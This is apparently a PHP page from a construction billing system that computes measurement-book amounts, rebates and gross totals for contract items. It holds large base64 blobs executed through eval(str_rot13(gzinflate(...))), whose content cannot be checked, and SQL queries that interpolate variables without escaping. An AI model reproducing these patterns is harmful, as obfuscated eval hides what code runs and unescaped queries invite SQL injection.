91V5rEs+HJe4feH2PM+jLGlAMkCCJgBgGdrihOlZ8/3vz4l9C8eWrTCGHZSaxPzeGAqyjM5/zlNhZaT2Qe0qBnnCkOGnkdS2SPenK+Wlh3Ck0lTWR95zKZ4ZoD2s71srqBfm9pMXcIfx6DMBBsAhXNupZ+FHbhMfCZDwPE6ahgdkkQ7IVtg4ixCESgQeJBKtHEWHZwFtplhZCfCLYe0wxagPA7UxgUwfHg8Nr/MkownkJAV+a4ydyo+/enZVwMS4S87zByQU7+QlQIwjQ6e4lbF0e/VzjcyQnom/r6o0e5I21vQHd7nkftB3Fn0wcT6VaKQ57SrgWMTRk5ZSei1HqGn1hN4EQaYzZH9aOpsr/96Y/X77cHiTD3etUSiF6wzTonqS7PO2mGKJI+KcvA/v7lCv1wcI2KfpT1YEROpOyaZa0LbzAmWdAJhQhlaGKD9UWQYZio+lXc11TGkmkg8kA9dwxTrb4V2pW3L0eIAkOTOtVzKk6FA5dGccIw/e5XH2L7Hgj3oB4z3gXcR0Yy6tevVr1kPYgTZy3wwXEMyY+cRw5GUbVQZ153x/oVVqNUglH7J1Bm2VUBoRZNWx19ff8ksJdR0vbPuRls+8p1g5v2L9ht//717/f1n/8B')))));

?>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor="#FFFFFF" id="table1">
<?php echo $tablehead; ?>
<!--<tr bgcolor="#d4d8d8" style="height:5px"><td colspan="13" style="border-top-color:#666666; border-bottom-color:#666666;height:5px"></td></tr>-->
<?php 
//$Line = $Line+2;

include('CementVariationAmtRABHistory.php');
include('SupplementAgmtRebate.php');

$color_var = 0; $table_group_row = 0; $temp_array = array(); $OverAllDpmAmount = 0; $OverAllSlmDpmAmount = 0; $OverAllSlmDpmAmount = 0; $SubdividSlmStr = ""; $RebateCalcFlag = 0;

$QSPPMasterArr = array(); $QSPPMasterMbIdArr = array();
$QSPPSLMMasterArr = array(); $QSPPSLMMasterMbIdArr = array();
$QSPPDPMMasterArr = array(); $QSPPDPMMasterMbIdArr = array();
$QSPPRefMBPageArr = array();
$SelectQtySplitQuery = "select * from pp_qty_splt where sheetid = '$abstsheetid' and rbn <= '$rbn'";
$SelectQtySplitSql = mysql_query($SelectQtySplitQuery);
if($SelectQtySplitSql == true){
	if(mysql_num_rows($SelectQtySplitSql)>0){
		while($QSPPList = mysql_fetch_object($SelectQtySplitSql)){
			$QSPPQty 	= $QSPPList->qty;
			$QSPPPerc 	= $QSPPList->percent;
			$QSPPRate 	= $QSPPList->rate;
			$QSPPMBId 	= $QSPPList->gr_par_id;//gpmbid;
			$QSPPRbn 	= $QSPPList->rbn;
			$QSPPAmt = round(($QSPPQty*$QSPPRate*$QSPPPerc/100),2); //echo $QSPPAmt."<br/>";
			
			if($QSPPRbn == $rbn){
				if(in_array($QSPPMBId, $QSPPSLMMasterMbIdArr)){
					$QSPPSLMMasterArr[$QSPPMBId] = $QSPPSLMMasterArr[$QSPPMBId] + $QSPPAmt;
				}else{
					array_push($QSPPSLMMasterMbIdArr,$QSPPMBId);
					$QSPPSLMMasterArr[$QSPPMBId] = $QSPPAmt;
				}
			}else{
				if(in_array($QSPPMBId, $QSPPDPMMasterMbIdArr)){
					$QSPPDPMMasterArr[$QSPPMBId] = $QSPPDPMMasterArr[$QSPPMBId] + $QSPPAmt;
				}else{
					array_push($QSPPDPMMasterMbIdArr,$QSPPMBId);
					$QSPPDPMMasterArr[$QSPPMBId] = $QSPPAmt;
				}
			}
			$QSPPRefMBPageArr[$QSPPMBId][0] = $QSPPList->mbookno;
			$QSPPRefMBPageArr[$QSPPMBId][1] = $QSPPList->page;
		}
	}
}
//print_r($QSPPRefMBPageArr);
$PPayRefArr = array();
/*$unionqur = "(SELECT subdivid  FROM mbookgenerate WHERE sheetid = '$abstsheetid') UNION (SELECT subdivid  FROM measurementbook WHERE sheetid = '$abstsheetid' AND (part_pay_flag = '0' OR part_pay_flag = '1'))";
$unionsql = mysql_query($unionqur);
while($Listsubdivid = mysql_fetch_array($unionsql)) { $subdivid_list .= $Listsubdivid['subdivid']."*"; }
$subdivisionlist_1 = explode("*",rtrim($subdivid_list,"*"));
natsort($subdivisionlist_1);*/
$MastSuppSheetIdArr = array();
$MasterItemArrNI = array(); $MasterItemArrDI = array(); $MasterItemArrEI = array(); $MasterItemArrSI = array(); $MasterItemFlagArr = array(); $DIHead = 0; $EIHead = 0;  $no_of_supp_agg = 1; $DI_Amount_EI_Amount_Str = ""; $txtbox_id_di_ei = 0;
//$unionqur = "(SELECT a.subdivid, b.subdiv_name, c.item_flag FROM mbookgenerate a inner join subdivision b on (a.subdivid = b.subdiv_id) inner join schdule c on (a.subdivid = c.subdiv_id) WHERE a.sheetid = '$abstsheetid' and b.sheet_id = '$abstsheetid' ORDER BY b.supp_sheet_id asc) UNION (SELECT a.subdivid, b.subdiv_name, c.item_flag FROM measurementbook a inner join subdivision b on (a.subdivid = b.subdiv_id) inner join schdule c on (a.subdivid = c.subdiv_id) WHERE a.sheetid = '$abstsheetid' AND b.sheet_id = '$abstsheetid' AND (a.part_pay_flag = '0' OR a.part_pay_flag = '1') ORDER BY b.supp_sheet_id asc)";
//$unionqur = "select DISTINCT subdivid from measurementbook where sheetid = '$abstsheetid' AND rbn<='$rbn' AND (part_pay_flag = '0' OR part_pay_flag = '1')";
$unionqur = "SELECT a.subdivid, b.subdiv_name, c.item_flag, c.supp_sheet_id FROM measurementbook a inner join subdivision b on (a.subdivid = b.subdiv_id) inner join schdule c on (a.subdivid = c.subdiv_id) WHERE a.sheetid = '$abstsheetid' AND b.sheet_id = '$abstsheetid' ANd a.rbn<='$rbn' AND (a.part_pay_flag = '0' OR a.part_pay_flag = '1') ORDER BY b.supp_sheet_id asc";
$unionsql = mysql_query($unionqur);
while($Listsubdivid = mysql_fetch_array($unionsql)) 
{ 
	$subdivid_list .= $Listsubdivid['subdivid']."*";
	
	$MasterItemId 	= $Listsubdivid['subdivid'];
	$MasterItemName = $Listsubdivid['subdiv_name'];
	$MasterItemFlag = $Listsubdivid['item_flag'];
	$MasterSupplId  = $Listsubdivid['supp_sheet_id'];
	if($MasterItemFlag == "NI")
	{
		$MasterItemArrNI[$MasterSupplId][$MasterItemId] = $MasterItemName;
	}
	if($MasterItemFlag == "DI")
	{
		$MasterItemArrDI[$MasterSupplId][$MasterItemId] = $MasterItemName;
	}
	if($MasterItemFlag == "EI")
	{
		$MasterItemArrEI[$MasterSupplId][$MasterItemId] = $MasterItemName;
	}
	if($MasterItemFlag == "SI")
	{
		$MasterItemArrSI[$MasterSupplId][$MasterItemId] = $MasterItemName;
	}
	$MasterItemArr[$MasterItemId] = $MasterItemName;
	$MasterItemFlagArr[$MasterItemId] = $MasterItemFlag;
	if(in_array($MasterSupplId, $MastSuppSheetIdArr)){
		
	}else{
		array_push($MastSuppSheetIdArr,$MasterSupplId);
	}
}
$subdivisionlist_1 = explode("*",rtrim($subdivid_list,"*"));
natsort($subdivisionlist_1);


/*foreach($subdivisionlist_1 as $key => $summ_1)
{
   if($summ_1 != "")
   {
      $subdivisionlist_2 .= $summ_1.",";
   }
}*/

/*natsort($MasterItemArrNI);
natsort($MasterItemArrDI);
natsort($MasterItemArrEI);
ksort($MasterItemArrSI);*/

//print_r($MasterItemArrSI);exit;
foreach($MastSuppSheetIdArr as $MastSuppSheetId){ 
	$MasterItemArrNI1 = array(); $MasterItemArrDI1 = array(); $MasterItemArrEI1 = array(); $MasterItemArrSI1 = array();
	if($MasterItemArrNI[$MastSuppSheetId] != ""){
		$MasterItemArrNI1 = $MasterItemArrNI[$MastSuppSheetId];
		natsort($MasterItemArrNI1);
	}
	if($MasterItemArrDI[$MastSuppSheetId] != ""){
		$MasterItemArrDI1 = $MasterItemArrDI[$MastSuppSheetId];
		natsort($MasterItemArrDI1);
	}
	if($MasterItemArrEI[$MastSuppSheetId] != ""){
		$MasterItemArrEI1 = $MasterItemArrEI[$MastSuppSheetId];
		natsort($MasterItemArrEI1);
	}
	if($MasterItemArrSI[$MastSuppSheetId] != ""){
		$MasterItemArrSI1 = $MasterItemArrSI[$MastSuppSheetId];
		ksort($MasterItemArrSI1);
	}
	foreach($MasterItemArrNI1 as $keyNI => $summ_1NI)
	{
	   if($summ_1NI != "")
	   {
		  $subdivisionlist_2 .= $keyNI.",";
	   }
	}
	//echo "NI = ".$subdivisionlist_2."<br/>";
	foreach($MasterItemArrDI1 as $keyDI => $summ_1DI)
	{
	   if($summ_1DI != "")
	   {
		  $subdivisionlist_2 .= $keyDI.",";
	   }
	}
	//echo "DI = ".$subdivisionlist_2."<br/>";
	foreach($MasterItemArrEI1 as $keyEI => $summ_1EI)
	{
	   if($summ_1EI != "")
	   {
		  $subdivisionlist_2 .= $keyEI.",";
	   }
	}
	//echo "EI = ".$subdivisionlist_2."<br/>";
	foreach($MasterItemArrSI1 as $keySI => $summ_1SI)
	{
	   if($summ_1SI != "")
	   {
		  $subdivisionlist_2 .= $keySI.",";
	   }
	}
}
//echo $subdivisionlist_2;exit;
$subdivisionlist = explode(',',rtrim($subdivisionlist_2,",")); $prev_supp_sheetid = ""; $prev_supp_sheetid_temp = "";
for($i=0;$i<count($subdivisionlist);$i++)
{
	eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

//echo $subdivname." = ".$Line." = ".$LineTemp." = ".$Linecheck."<br/>";



/*************************************** THIS PART IS FOR DISPLAY SUPPLEMENTARY AGREEMNT TITLE SECTION   - STARTS HERE ****************************************/
if($DIHead == 0) /// For the very first time 
{
	if($item_flag != "NI")
	{ 
		//$overall_rebate_perc = 2;
		$SlmRebateAmount 		=  round(($OverAllSlmAmount 	* 	$overall_rebate_perc /100),2);
		$DpmRebateAmount 		=  round(($OverAllDpmAmount 	* 	$overall_rebate_perc /100),2);
		$SlmDpmRebateAmount 	=  round(($OverAllSlmDpmAmount * 	$overall_rebate_perc /100),2);
		
		$SlmNetAmount 			=  round(($OverAllSlmAmount - $SlmRebateAmount),2); 
		$DpmNetAmount 			=  round(($OverAllDpmAmount - $DpmRebateAmount),2); 
		$SlmDpmNetAmount 		=  round(($OverAllSlmDpmAmount - $SlmDpmRebateAmount),2);

		
		$RebateCalcFlag = 1;
?>
		<tr>
			<td colspan='3' align='left' class='labelbold'><input type="text" name="txt_co_di_ei<?php echo $txtbox_id_di_ei; ?>" id="txt_co_di_ei<?php echo $txtbox_id_di_ei; ?>" style="width:98%; border:none;" readonly="" class="labelbold"/></td>
			<td colspan="2" align="right" nowrap="nowrap">TOTAL AMOUNT</td>
			<td align='right' class='labelbold'><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td></td>
			<td></td>
			<td align='right' class='labelbold'><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td></td>
			<td align='right' class='labelbold'><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td></td>
		</tr>
<?php if($prev_item_flag == "NI"){ ?>		
		<tr class="labelprint">
			<td colspan="2" align="right">Less Over All Rebate : <?php echo $overall_rebate_perc; ?>%&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SlmDpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SlmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<tr class="labelbold" bgcolor="#F0F0F0">
			<td colspan="2" align="right">Gross Amount&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SlmDpmNetAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DpmNetAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
